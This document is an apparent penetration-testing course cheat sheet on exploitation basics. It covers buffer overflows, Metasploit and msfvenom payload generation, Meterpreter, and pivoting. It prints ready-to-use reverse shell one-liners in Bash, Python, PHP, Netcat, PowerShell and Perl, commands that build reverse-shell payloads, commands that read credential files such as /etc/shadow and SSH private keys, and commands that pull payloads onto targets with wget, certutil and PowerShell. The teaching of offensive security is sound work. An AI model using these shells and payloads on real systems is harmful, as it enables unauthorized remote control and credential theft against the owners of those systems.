# Module 7: Exploitation Basics - Quick Reference

## Vulnerability Categories
- **Remote Code Execution (RCE)** - Execute arbitrary code on target
- **Privilege Escalation** - Gain higher permissions (user → root/administrator)
- **Denial of Service (DoS)** - Crash or overwhelm service
- **Information Disclosure** - Leak sensitive data
- **Buffer Overflow** - Overwrite memory by exceeding buffer bounds
- **Format String** - Read/write memory via printf-style functions
- **Race Condition** - Exploit timing of concurrent operations
- **Integer Overflow** - Wrap-around in integer arithmetic

## Buffer Overflow Basics
- **Stack Overflow**: Overflow local buffer → overwrite return address → control EIP
- **Heap Overflow**: Overflow heap buffer → corrupt heap metadata → arbitrary write
- **Exploitation Steps**: Fuzzing → Find offset (pattern_create/pattern_offset) → Identify bad chars → Find return address (JMP ESP gadget) → Shellcode
- **Protections**:
  - **ASLR** - Randomizes memory addresses (bypass with info leak + bruteforce)
  - **DEP/NX** - Non-executable stack/heap (bypass with ROP chains)
  - **Stack Canaries** - Detect stack overflow before return (bypass with info leak)
  - **PIE** - Position-independent executable (bypass with base leak)
  - **RELRO** - Read-only relocation tables (Full RELRO prevents GOT overwrite)
- **ROP (Return-Oriented Programming)**: Chain existing code snippets (gadgets) to bypass NX

## Metasploit Framework
- **Modules**: Exploit, Payload, Auxiliary, Post, Encoder, NOP
- **Key Commands**:
  - `msfconsole` - Start Metasploit
  - `use module_path` - Select module
  - `show options` / `show payloads` / `show targets` - View info
  - `set OPTION value` / `setg OPTION value` - Set options (global)
  - `run` / `exploit` - Execute module
  - `check` - Test if target vulnerable
  - `back` - Return to main menu
  - `search keyword` - Search modules
  - `sessions -l` - List active sessions
  - `sessions -i ID` - Interact with session
- **msfvenom** (payload generation):
  - `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o payload.elf`
  - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o payload.exe`
  - `msfvenom -p linux/x64/shell/reverse_tcp LHOST=IP LPORT=PORT -f py -o payload.py`
  - `-e` encoder, `-b` bad chars, `-i` iterations, `-x` template

## Payloads
- **Staged**: Small stager (first stage) → downloads main payload (stage). Use `/` in name: `windows/meterpreter/reverse_tcp`
- **Stageless**: Full payload in one. Use `_` in name: `windows/meterpreter_reverse_tcp`
- **Types**:
  - **Reverse shell** - Target connects to attacker (bypasses inbound firewalls)
  - **Bind shell** - Target opens port, attacker connects (requires inbound access)
  - **Meterpreter** - Advanced in-memory payload with many post-exploit features
  - **Generic shell** - Standard OS command shell
  - **Beacon** - Cobalt Strike payload (HTTP/HTTPS/DNS C2)

## Meterpreter
- **In-memory execution** (reflective DLL injection on Windows)
- **Key commands**: `sysinfo`, `getuid`, `getsystem`, `hashdump`, `ps`, `shell`, `download`, `upload`, `screenshot`, `keyscan_start`, `webcam_snap`
- **Extensions**: `load kiwi` (Mimikatz), `load incognito` (token theft), `load priv`
- **Migrate**: Move meterpreter to a different process (stealth + stability)
- **Background**: Send session to background (continue working in msfconsole)

## Reverse Shell One-Liners
- **Bash**: `bash -i >& /dev/tcp/IP/PORT 0>&1`
- **Python**: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'`
- **PHP**: `php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`
- **Netcat**: `nc -e /bin/sh IP PORT` or `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f`
- **PowerShell**: `powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
- **Perl**: `perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'`

## Shell Upgrade (Linux)
- `python3 -c 'import pty;pty.spawn("/bin/bash")'` - Better shell
- `stty raw -echo; fg; reset` - Full TTY (Ctrl+C, tab complete, history)
- `export TERM=xterm` - Terminal colors and proper display
- `stty rows 38 columns 116` - Set terminal size

## Post-Exploitation
- **Linux**:
  - Find SUID: `find / -perm -4000 2>/dev/null`
  - Check sudo: `sudo -l`
  - Cron jobs: check `/etc/crontab`, `ls -la /etc/cron*`
  - Writable scripts: `find / -writable -type f 2>/dev/null | grep -v proc`
  - OS/kernel: `uname -a`, `cat /etc/os-release`
  - Network: `ss -tuln`, `ip a`, `arp -a`
  - Users: `cat /etc/passwd`, `cat /etc/shadow` (if readable)
  - History: `cat ~/.bash_history`
  - SSH keys: `cat ~/.ssh/authorized_keys`, `cat ~/.ssh/id_rsa`
- **Windows**:
  - Current user/privs: `whoami /all`
  - System info: `systeminfo`
  - Processes: `tasklist /v`
  - Network: `ipconfig /all`, `netstat -an`
  - Users: `net users`, `net localgroup administrators`
  - Patches: `wmic qfe list`
  - Services: `wmic service list brief`, `sc query`
  - Registry auto-run: `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

## Privilege Escalation Vectors
- **Linux**: Kernel exploits, SUID binaries, sudo misconfig, cron jobs, capabilities, writable /etc/passwd, PATH hijacking, Docker socket, NFS
- **Windows**: Kernel exploits, service misconfigs (unquoted paths, weak perms), AlwaysInstallElevated, DLL hijacking, credential theft, UAC bypass, token manipulation
- **AD**: Kerberoasting, AS-REP roasting, Pass-the-Hash, Pass-the-Ticket, DCSync, ACL abuse, Group Policy abuse, BloodHound

## Transferring Files
- **Python HTTP server**: `python3 -m http.server 8000`
- **wget/curl**: `wget http://IP/payload` / `curl -O http://IP/payload`
- **Netcat**: `nc -lvnp 4444 < file` (sending), `nc IP 4444 > file` (receiving)
- **Base64 encoding**: `base64 -w0 file` (encode), `echo "base64" | base64 -d > file` (decode)
- **PowerShell**: `iwr -Uri http://IP/file -OutFile file.exe` (PS 3+), `(New-Object Net.WebClient).DownloadFile('http://IP/file', 'file.exe')`
- **SMB**: `smbclient //IP/share -c 'get file'`
- **certutil** (Windows): `certutil -urlcache -f http://IP/file file.exe`

## Pivoting
- **Add route** (metasploit): `route add 192.168.1.0 255.255.255.0 1`
- **SOCKS proxy**: `auxiliary/server/socks_proxy` + proxychains
- **SSH tunneling**: `-L` local, `-R` remote, `-D` dynamic (SOCKS)
- **Chisel**: TCP/UDP tunnel over HTTP
- **Ligolo-ng**: Advanced pivoting with interface binding

## Living Off the Land (LOLBins)
- **Linux**: `curl`, `wget`, `python`, `perl`, `xxd`, `base64`, `gcc`, `nmap --script`
- **Windows**: `powershell`, `certutil`, `bitsadmin`, `mshta`, `rundll32`, `regsvr32`, `msbuild`, `cscript`, `wmic`, `net`, `schtasks`
